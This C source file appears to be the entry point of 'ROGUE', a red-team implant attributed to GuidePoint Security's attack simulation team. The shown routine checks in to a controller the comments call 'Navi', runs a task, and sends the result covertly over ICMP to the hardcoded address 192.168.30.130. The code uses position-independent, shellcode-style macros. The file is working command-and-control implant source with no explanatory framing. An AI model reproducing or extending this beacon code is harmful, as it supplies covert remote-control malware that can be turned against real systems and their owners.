/*!
 *
 * ROGUE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct __attribute__(( packed, scalar_storage_order( "big-endian" ) ))
{
	UINT32	UniqueTaskId;
	UINT32	ReturnCode;
	UINT32	ErrorCode;
	UINT8	Buffer[0];
} TASK_ERROR_INFO, *PTASK_ERROR_INFO ;


/*!
 *
 * Purpose:
 *
 * Starts tasking back to Navi, executes the
 * task, sends the result, and then goes to
 * sleep.
 *
!*/
D_SEC( B ) VOID WINAPI Entry( VOID )
{
	TASK_ERROR_INFO 	Tsk;
	PBUFFER			Inb = NULL; 
	PBUFFER			Onb = NULL;

	RtlSecureZeroMemory( &Tsk, sizeof( Tsk ) );

	if ( ( Inb = BufferCreate() ) != NULL ) {
		if ( ( Onb = BufferCreate() ) ) {
			BufferPrintf( Onb, C_PTR( G_PTR( "%s" ) ), C_PTR( G_PTR( "AAAAABBBBB" ) ) );
			BufferAddRaw( Onb, &Tsk, sizeof( Tsk ) );

			if ( TaskHello( Inb->Buffer, Inb->Length, Onb ) ) {
				IcmpSendRecv( C_PTR( G_PTR( "192.168.30.130" ) ), Onb->Buffer, Onb->Length, NULL, NULL, NULL );
			};
		};
	};
};
